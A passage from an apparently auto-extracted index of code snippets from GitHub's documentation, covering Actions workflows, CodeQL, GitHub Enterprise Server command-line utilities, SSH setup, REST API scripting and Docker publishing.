action. The `always()` function ensures the upload happens even if the tests fail.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: Upload artifact from Ubuntu\n\non: [push]\n\njobs:\n  upload-pester-results:\n    name: Run Pester and upload results\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Test with Pester\n        shell: pwsh\n        run: Invoke-Pester Unit.Tests.ps1 -Passthru | Export-CliXml -Path Unit.Tests.xml\n      - name: Upload test results\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: ubuntu-Unit-Tests\n          path: Unit.Tests.xml\n    if: {% raw %}${{ always() }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Java Project with Ant\nDESCRIPTION: This snippet creates a CodeQL database for a Java/Kotlin project built with Ant.  It uses `ant -f build.xml` to execute the build. It assumes Ant, a `build.xml` file, and CodeQL CLI are installed and correctly configured.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create java-database --language=java-kotlin --command='ant -f build.xml'\n```\n\n----------------------------------------\n\nTITLE: Setting TTL for fail state using nes set-node-ttl\nDESCRIPTION: This snippet demonstrates how to set the Time To Live (TTL) setting for the `fail` state of the Node Eligibility Service (NES) using the `nes set-node-ttl` command. Replace MINUTES with the desired TTL value in minutes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-ttl fail MINUTES\n```\n\n----------------------------------------\n\nTITLE: Checking Manager Pod Status\nDESCRIPTION: This snippet uses `kubectl get pods` to check the status of the manager pods in the `arc-systems` namespace, verifying that they are running after the installation.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nkubectl get pods -n arc-systems\n```\n\n----------------------------------------\n\nTITLE: Uploading Data via STDIN to GitHub Support (Shell)\nDESCRIPTION: Uploads data streamed via STDIN to GitHub Support and associates it with a ticket using the `ghe-support-upload` utility.  The `-t` option specifies the ticket ID, and the `-d` option provides a description of the data being uploaded. This example uses `ghe-repl-status` as the data source, but any command that outputs data to STDOUT can be used.  Replace `TICKET_ID` and the command for streaming the data.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_96\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-status -vv | ghe-support-upload -t TICKET_ID -d \"Verbose Replication Status\"\n```\n\n----------------------------------------\n\nTITLE: Encrypting a secret using Ruby\nDESCRIPTION: This snippet demonstrates how to encrypt a secret using Ruby and the RbNaCl gem. It decodes the Base64 encoded public key, creates a `RbNaCl::PublicKey` object, initializes a `RbNaCl::Boxes::Sealed` box, encrypts the secret, and then prints the Base64 encoded result. Requires the `rbnacl` and `base64` gems.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/encrypting-secrets-for-the-rest-api.md#_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\nrequire \"rbnacl\"\nrequire \"base64\"\n\nkey = Base64.decode64(\"YOUR_BASE64_KEY\")\npublic_key = RbNaCl::PublicKey.new(key)\n\nbox = RbNaCl::Boxes::Sealed.from_public_key(public_key)\nencrypted_secret = box.encrypt(\"YOUR_SECRET\")\n\n# Print the base64 encoded secret\nputs Base64.strict_encode64(encrypted_secret)\n```\n\n----------------------------------------\n\nTITLE: Optimized Prime Number Generation\nDESCRIPTION: This Python code optimizes prime number generation using the Sieve of Eratosthenes algorithm.  This drastically reduces the execution time compared to the previous inefficient method. The code calculates and prints every 1000th prime number up to the 10,000th prime, and measures the execution time.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-for-performance-optimization.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport time\n\ndef sieve_of_eratosthenes(limit):\n    sieve = [True] * (limit + 1)\n    sieve[0] = sieve[1] = False\n    for start in range(2, int(limit**0.5) + 1):\n        if sieve[start]:\n            for multiple in range(start*start, limit + 1, start):\n                sieve[multiple] = False\n    return [num for num, is_prime in enumerate(sieve) if is_prime]\n\ndef every_1000th_prime():\n    limit = 105000  # Higher than needed to ensure 10,000 primes\n    primes = sieve_of_eratosthenes(limit)\n    return [primes[i] for i in range(999, 10000, 1000)]\n\nif __name__ == \"__main__\":\n    start_time = time.time()\n    primes = every_1000th_prime()\n    for prime in primes:\n        print(prime)\n    end_time = time.time()\n    elapsed_time = end_time - start_time\n    print(f\"Time taken: {elapsed_time:.10f} seconds\")\n```\n\n----------------------------------------\n\nTITLE: Audit GitLab Instance to Generate Reusable Workflow Config (Shell)\nDESCRIPTION: This command audits a GitLab instance to generate a configuration file for reusable workflows.  It should be run without the `--config-file-path` argument. The output will contain a `config.yml` file containing a list of the composite actions that were converted.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer audit gitlab --output-dir ./output/\n```\n\n----------------------------------------\n\nTITLE: Starting GitHub Actions on GHES\nDESCRIPTION: This command starts {% data variables.product.prodname_actions %} on {% data variables.location.product_location %} after it has been previously stopped. It should be run from the primary node in high availability configurations. If successful, the output will confirm that Actions was enabled.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_71\n\nLANGUAGE: shell\nCODE:\n```\nActions was enabled!\n```\n\n----------------------------------------\n\nTITLE: Configuring PyPI Publish Job with OIDC in GitHub Actions\nDESCRIPTION: This workflow configuration demonstrates how to use OpenID Connect (OIDC) with the `pypa/gh-action-pypi-publish` action to securely publish Python packages to PyPI. It outlines the necessary job permissions (`id-token: write`) and steps to retrieve release distributions and publish them using the action. The example avoids using explicit usernames or passwords, relying instead on OIDC for authentication. The `release-build` job builds the distribution and uploads it as an artifact.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  release-build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: \"3.x\"\n\n      - name: build release distributions\n        run: |\n          # NOTE: put your own distribution build steps here.\n          python -m pip install build\n          python -m build\n\n      - name: upload windows dists\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: release-dists\n          path: dist/\n\n  pypi-publish:\n    runs-on: ubuntu-latest\n    needs:\n      - release-build\n    permissions:\n      id-token: write\n\n    steps:\n      - name: Retrieve release distributions\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: release-dists\n          path: dist/\n\n      - name: Publish release distributions to PyPI\n        uses: pypa/gh-action-pypi-publish@3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f\n```\n\n----------------------------------------\n\nTITLE: Getting Elasticsearch Index Status with ghe-es-index-status - Shell\nDESCRIPTION: This snippet demonstrates using `ghe-es-index-status` to get a summary of Elasticsearch indexes in CSV format, which can be printed to STDOUT and piped to `column` for better readability. It requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-es-index-status -do\n> warning: parser/current is loading parser/ruby23, which recognizes\n> warning: 2.3.3-compliant syntax, but you are running 2.3.4.\n> warning: please see https://github.com/whitequark/parser#compatibility-with-ruby-mri.\n> Name,Primary,Searchable,Writable,UpToDate,RepairProgress,Version\n> code-search-1,true,true,true,true,100.0,72e27df7c631b45e026b42bfef059328fa040e17\n> commits-5,true,true,true,true,100.0,7ed28813100c47813ef654c0ee2bb9abf21ab744\n> gists-4,true,true,true,true,100.0,cf8e7d04fcf2564c902e2873c424a279cc41079d\n> issues-4,false,false,false,true,100.0,d0bb08f71eebf6e7b070572aa399b185dbdc8a76\n> issues-5,true,true,true,true,100.0,d0bb08f71eebf6e7b070572aa399b185dbdc8a76\n> projects-2,true,true,true,true,100.0,c5cac1c4b3c66d42e609d088d174dbc3dd44469a\n> pull-requests-6,true,true,true,true,100.0,6a466ad6b896a3499509990979bf9a18d7d41de3\n> repos-6,true,true,true,true,100.0,6c8b5fbba0fc1e409558db411d05e092c1387082\n> users-5,true,true,true,true,100.0,38984875552bb826c9ec42999f409cb2e95556eb\n> wikis-4,true,true,true,true,100.0,2613dec44bd14e14577803ac1f9e4b7e07a7c234\n```\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-es-index-status -do | column -ts,\n> warning: parser/current is loading parser/ruby23, which recognizes\n> warning: 2.3.3-compliant syntax, but you are running 2.3.4.\n> warning: please see https://github.com/whitequark/parser#compatibility-with-ruby-mri.\n> Name             Primary  Searchable  Writable  UpToDate  RepairProgress  Version\n> code-search-1    true     true        true      true      100.0           72e27df7c631b45e026b42bfef059328fa040e17\n> commits-5        true     true        true      true      100.0           7ed28813100c47813ef654c0ee2bb9abf21ab744\n> gists-4          true     true        true      true      100.0           cf8e7d04fcf2564c902e2873c424a279cc41079d\n> issues-4         false    false       false     true      100.0           d0bb08f71eebf6e7b070572aa399b185dbdc8a76\n> issues-5         true     true        true      true      100.0           d0bb08f71eebf6e7b070572aa399b185dbdc8a76\n> projects-2       true     true        true      true      100.0           c5cac1c4b3c66d42e609d088d174dbc3dd44469a\n> pull-requests-6  true     true        true      true      100.0           6a466ad6b896a3499509990979bf9a18d7d41de3\n> repos-6          true     true        true      true      100.0           6c8b5fbba0fc1e409558db411d05e092c1387082\n> users-5          true     true        true      true      100.0           38984875552bb826c9ec42999f409cb2e95556eb\n> wikis-4          true     true        true      true      100.0           2613dec44bd14e14577803ac1f9e4b7e07a7c234\n```\n\n----------------------------------------\n\nTITLE: Publish Docker Image to Multiple Registries with GitHub Actions\nDESCRIPTION: This workflow demonstrates how to publish a Docker image to both Docker Hub and GitHub Container Registry. It uses `docker/login-action` to log in to both registries, `docker/metadata-action` to extract metadata, and `docker/build-push-action` to build and push the image. The workflow is triggered on a release event.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-docker-images.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registries:\n    name: Push Docker image to multiple registries\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    permissions:\n      packages: write\n      contents: read\n      {% ifversion artifact-attestations %}attestations: write{% endif %}\n      {% ifversion artifact-attestations %}id-token: write{% endif %}\n    steps:\n      - name: Check out the repo\n        uses: {% data reusables.actions.action-checkout %}\n\n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: {% raw %}${{ secrets.DOCKER_USERNAME }}{% endraw %}\n          password: {% raw %}${{ secrets.DOCKER_PASSWORD }}{% endraw %}\n\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: {% ifversion fpt or ghec %}ghcr.io{% elsif ghes %}{% data reusables.package_registry.container-registry-hostname %}{% else %}docker.pkg.github.com{% endif %}\n          username: {% raw %}${{ github.actor }}{% endraw %}\n          password: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: |\n            my-docker-hub-namespace/my-docker-hub-repository\n            {% data reusables.package_registry.container-registry-hostname %}/{% raw %}${{ github.repository }}{% endraw %}\n\n      - name: Build and push Docker images\n        id: push\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          push: true\n          tags: {% raw %}${{ steps.meta.outputs.tags }}{% endraw %}\n          labels: {% raw %}${{ steps.meta.outputs.labels }}{% endraw %}\n\n{% ifversion artifact-attestations %}\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: {% data reusables.package_registry.container-registry-hostname %}/{% raw %}${{ github.repository }}{% endraw %}\n          subject-digest: {% raw %}${{ steps.push.outputs.digest }}{% endraw %}\n          push-to-registry: true\n{% endif -%}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_REPOSITORY_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_REPOSITORY_URL` to the GitHub Actions equivalent `${{ github.event.repository.clone_url }}`.  Provides the URL for cloning the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_45\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.repository.clone_url }}\n```\n\n----------------------------------------\n\nTITLE: Setting Playwright Timeouts\nDESCRIPTION: These commands set environment variables to increase the default timeouts for Playwright tests and assertions, allowing more time for tests to complete, especially in slower environments.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nexport PLAYWRIGHT_TIMEOUT=20000  # 20 seconds\n```\n\nLANGUAGE: shell\nCODE:\n```\nexport PLAYWRIGHT_EXPECT_TIMEOUT=4000 # 4 seconds\n```\n\n----------------------------------------\n\nTITLE: Verifying SSH Connection with Correct 'git' User\nDESCRIPTION: This snippet demonstrates the correct way to verify an SSH connection to GitHub, using the 'git' user. It helps confirm that the SSH setup is correct and that authentication is successful.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nssh -T git@{% data variables.product.product_url %}\n```\n\n----------------------------------------\n\nTITLE: Setting and Removing Announcement Banners - Shell\nDESCRIPTION: This snippet demonstrates how to use the `ghe-announce` utility to set and remove announcement banners on GitHub Enterprise Server. The `-s` flag sets the message, `-u` removes the message, and `-d` sets a user-dismissible message. Announcements can be global or user-specific. The utility requires SSH access to the administrative shell.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# Sets a message that's visible to everyone\n$ ghe-announce -s MESSAGE\n> Announcement message set.\n# Removes a previously set message\n$ ghe-announce -u\n> Removed the announcement message\n```\n\nLANGUAGE: shell\nCODE:\n```\n# Sets a user-dismissible message that's visible to everyone\n$ ghe-announce -d -s MESSAGE\n> Announcement message set.\n# Removes a previously set message\n$ ghe-announce -u\n> Removed the announcement message, which was user\n> dismissible: MESSAGE\n```\n\n----------------------------------------\n\nTITLE: Creating Amazon OIDC Provider using AWS CLI\nDESCRIPTION: This AWS CLI command creates an OIDC provider in Amazon IAM. Replace `HOSTNAME` with the GHES public hostname and `THUMBPRINT` with the SHA1 thumbprint obtained previously. This provider is used for OIDC-based authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/enabling-github-actions-for-github-enterprise-server/enabling-github-actions-with-amazon-s3-storage.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\naws iam create-open-id-connect-provider \\\n  --url https://HOSTNAME/_services/token \\\n  --client-id-list \"sts.amazonaws.com\" \\\n  --thumbprint-list \"THUMBPRINT\"\n```\n\n----------------------------------------\n\nTITLE: Writing to GITHUB_STATE in JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to write to the `GITHUB_STATE` file, which is used to share values between pre and post actions. It appends a line to the file, creating an environment variable prefixed with `STATE_` that can be accessed by other actions within the same job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_25\n\nLANGUAGE: javascript\nCODE:\n```\nimport * as fs from 'fs'\nimport * as os from 'os'\n\nfs.appendFileSync(process.env.GITHUB_STATE, `processID=12345${os.EOL}`, {\n  encoding: 'utf8'\n})\n```\n\n----------------------------------------\n\nTITLE: Forwarding webhooks with smee\nDESCRIPTION: This command forwards webhooks from a smee.io URL to a local server.  `WEBHOOK_PROXY_URL` should be replaced with the URL obtained from smee.io. `PATH` should match the endpoint where your local server expects to receive webhooks. `PORT` should be the port number your local server is listening on.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/testing-webhooks.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nsmee --url WEBHOOK_PROXY_URL --path /PATH --port PORT\n```\n\n----------------------------------------\n\nTITLE: Including Queries by Tag - YAML\nDESCRIPTION: This example demonstrates how to include only queries that have the `security` tag within the `codeql/cpp-queries` pack. Only queries with the `security` tag will be part of the suite.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n- qlpack: codeql/cpp-queries\n- include:\n    tags contain: security\n```\n\n----------------------------------------\n\nTITLE: Generating Mannequin CSV with gei extension (GitHub CLI)\nDESCRIPTION: This command generates a CSV file containing a list of mannequins for a specified GitHub organization. The CSV file can then be used for bulk mannequin reclamation. Replace DESTINATION with the target GitHub organization name and FILENAME.csv with your desired output file name.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh gei generate-mannequin-csv --github-target-org DESTINATION --output FILENAME.csv\n```\n\n----------------------------------------\n\nTITLE: Creating a GeoJSON map\nDESCRIPTION: This code snippet illustrates how to create a map using GeoJSON syntax. It defines a FeatureCollection with a single Feature, specifying the geometry as a Polygon with coordinates representing a rectangular area.  The map is rendered based on these coordinates.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-diagrams.md#_snippet_2\n\nLANGUAGE: GeoJSON\nCODE:\n```\n{\n  \"type\": \"FeatureCollection\",\n  \"features\": [\n    {\n      \"type\": \"Feature\",\n      \"id\": 1,\n      \"properties\": {\n        \"ID\": 0\n      },\n      \"geometry\": {\n        \"type\": \"Polygon\",\n        \"coordinates\": [\n          [\n              [-90,35],\n              [-90,30],\n              [-85,30],\n              [-85,35],\n              [-90,35]\n          ]\n        ]\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Changing SSH Key Passphrase\nDESCRIPTION: This command allows you to change the passphrase for an existing SSH private key without regenerating the key pair. It prompts for the old passphrase (if any) and then asks for the new passphrase twice to confirm.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/working-with-ssh-key-passphrases.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ ssh-keygen -p -f ~/.ssh/id_ed25519\n> Enter old passphrase: [Type old passphrase]\n> Key has comment 'your_email@example.com'\n> Enter new passphrase (empty for no passphrase): [Type new passphrase]\n> Enter same passphrase again: [Repeat the new passphrase]\n> Your identification has been saved with the new passphrase.\n```\n\n----------------------------------------\n\nTITLE: Disabling RSA-SHA1 SSH connections\nDESCRIPTION: This command disables SSH connections using RSA keys that are signed with the SHA-1 hash function.  It sets the `app.gitauth.rsa-sha1` configuration to `false` effectively rejecting these connections.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-ssh-connections-to-your-instance.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.gitauth.rsa-sha1 false\n```\n\n----------------------------------------\n\nTITLE: Scheduling Workflow on Specific Days and Conditional Execution\nDESCRIPTION: This snippet shows how to schedule a workflow to run at 5:30 UTC every Monday-Thursday, with conditional execution of a step based on the specific schedule event. The workflow uses multiple `schedule` events and accesses the `github.event.schedule` context to determine which schedule triggered the workflow. It utilizes the `if` conditional to skip a step on Monday and Wednesday.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/actions-scheduled-workflow-example.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  schedule:\n    - cron: '30 5 * * 1,3'\n    - cron: '30 5 * * 2,4'\n\njobs:\n  test_schedule:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Not on Monday or Wednesday\n        if: github.event.schedule != '30 5 * * 1,3'\n        run: echo \"This step will be skipped on Monday and Wednesday\"\n      - name: Every time\n        run: echo \"This step will always run\"\n```\n\n----------------------------------------\n\nTITLE: Including Queries by Tag and Precision - YAML\nDESCRIPTION: This example shows how to include queries from the `codeql/cpp-queries` pack that have the `security` tag and either `high` or `very-high` precision. It uses the `from` field to specify the QL pack and combines multiple precision levels in the `include` instruction.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: .\n  from: codeql/cpp-queries\n- include:\n    tags contain: security\n    precision:\n    - high\n    - very-high\n```\n\n----------------------------------------\n\nTITLE: Creating Support Bundle using SSH (ghe-support-bundle)\nDESCRIPTION: This command uses SSH to connect to the GitHub Enterprise Server instance and executes the `ghe-support-bundle` command-line utility. The `-o` option specifies that the output should be written to stdout, which is then redirected to a file named `support-bundle.tgz`. The `-p 122` option specifies the port for SSH, `admin@HOSTNAME` specifies the user and hostname of the server.  This command requires SSH access to the server.\nSOURCE: https://github.com/github/docs/blob/main/content/support/contacting-github-support/providing-data-to-github-support.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-support-bundle -o' > support-bundle.tgz\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on project events in YAML\nDESCRIPTION: This YAML snippet configures a GitHub workflow to trigger when a `project` event occurs, specifically when the `created` or `deleted` activity types are initiated. The workflow uses the `on` keyword to specify the trigger event and its types, which are `created` and `deleted` in this case. This event only occurs for projects owned by the workflow's repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  project:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Fetching Paginated Results with Octokit\nDESCRIPTION: This snippet demonstrates how to use the `paginate` method to retrieve all issues from a repository. It fetches 100 issues per page and continues until the last page is reached. The result is returned as an array of issues.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nissue_data = octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", owner: \"github\", repo: \"docs\", per_page: 100)\n```\n\n----------------------------------------\n\nTITLE: Auditing a specific Bitbucket Project\nDESCRIPTION: This bash script command audits pipelines associated with a specific project within a Bitbucket workspace for migration to GitHub Actions. It utilizes the `gh actions-importer` CLI.  The `--workspace` flag specifies the Bitbucket workspace, `--project-key` filters by project, and `--output-dir` designates the results directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer audit bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Writing the action code (entrypoint.sh)\nDESCRIPTION: The shell script executed by the Docker container. It prints a greeting message using the `who-to-greet` input, gets the current time, and sets it as an output variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n#!/bin/sh -l\n\necho \"Hello $1\"\ntime=$(date)\necho \"time=$time\" >> $GITHUB_OUTPUT\n\n```\n\n----------------------------------------\n\nTITLE: Complete Factorial Program with Function and Calls in Python\nDESCRIPTION: This snippet shows the complete code, including the `calculate_factorial` function definition and the calls to the function with different input values. It calculates and prints the factorial of 5, 7, 9, and 10 using a custom function.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/reusing-other-peoples-code-in-your-projects.md#_snippet_3\n\nLANGUAGE: Python\nCODE:\n```\ndef calculate_factorial(number):\n    # Initialize the factorial result to 1\n    factorial = 1\n\n    # Loop from 1 to number (inclusive) and multiply factorial by each number\n    for i in range(1, number + 1):\n        factorial *= i\n\n    return factorial\n\nprint(calculate_factorial(5))\nprint(calculate_factorial(7))\nprint(calculate_factorial(9))\nprint(calculate_factorial(10))\n```\n\n----------------------------------------\n\nTITLE: Querying Issues with GitHub CLI\nDESCRIPTION: This snippet demonstrates how to use the `gh api` command to retrieve issues from a GitHub repository and redirect the response to a file named `data.json`. It utilizes the `--header` option to specify the desired media type and `-F` to set the `per_page` parameter to 2. The command requires replacing `REPO-OWNER` and `REPO-NAME` with the actual repository owner and name, respectively.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_16\n\nLANGUAGE: shell\nCODE:\n```\ngh api \\\n--header 'Accept: application/vnd.github+json' \\\n--method GET /repos/REPO-OWNER/REPO-NAME/issues \\\n-F per_page=2 > data.json\n```\n\n----------------------------------------\n\nTITLE: Git Configuration for Repository Cache\nDESCRIPTION: This snippet configures Git to fetch from the repository cache instead of the primary instance using the `url.<base>.insteadOf` setting. It redirects requests for the primary instance URL to the repository cache URL.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n[url \"https://europe-ci.github.example.com/\"]\n\tinsteadOf = https://github.example.com/\n```\n\n----------------------------------------\n\nTITLE: Accessing Data from Octokit.paginate\nDESCRIPTION: This code demonstrates how to access the data returned by the `octokit.paginate` method.  The `paginate` method returns an array of data returned by the endpoint.  The code logs the number of issues returned and the title of the first issue.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\nconst data = await octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 100,\n  headers: {\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n\nconsole.log(`${data.length} issues were returned`)\nconsole.log(`The title of the first issue is: ${data[0].title}`)\n```\n\n----------------------------------------\n\nTITLE: Automating Git Commit Pushes with Awk and While Loop\nDESCRIPTION: This shell script automates pushing individual commits to a remote repository. It uses `git log` and `awk` to select commits, then iterates through them using a `while` loop, pushing each commit to the remote branch.  `BRANCH-NAME` should be replaced with the branch you're targeting and `REMOTE-NAME` with the appropriate remote.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/troubleshooting-the-2-gb-push-limit.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nstep_commits=$(git log --oneline --reverse refs/heads/BRANCH-NAME | awk 'NR % 1000 == 0')\necho \"$step_commits\" | while read commit message; do git push REMOTE-NAME +$commit:refs/heads/BRANCH-NAME; done\n```\n\n----------------------------------------\n\nTITLE: Verifying Artifact Attestation for Container Images with GitHub CLI\nDESCRIPTION: This command verifies artifact attestations for container images using the `gh attestation verify` command. It requires first logging in to the container registry using `docker login ghcr.io` and then specifying the image's FQDN prefixed with `oci://`, along with the repository name. Replace `ghcr.io/ORGANIZATION_NAME/IMAGE_NAME:test` with the correct image FQDN and `ORGANIZATION_NAME/REPOSITORY_NAME` with the correct repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ndocker login ghcr.io\n\ngh attestation verify oci://ghcr.io/ORGANIZATION_NAME/IMAGE_NAME:test -R ORGANIZATION_NAME/REPOSITORY_NAME\n```\n\n----------------------------------------\n\nTITLE: Analyzing `cleanup_job` Input JSON\nDESCRIPTION: This JSON represents the expected input for the `cleanup_job` command. The `command` field is set to `cleanup_job`, and the `state` field contains information about the network and containers to be cleaned up. The `responseFile` is set to null, indicating no response file is expected. The `args` field is empty.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"command\": \"cleanup_job\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      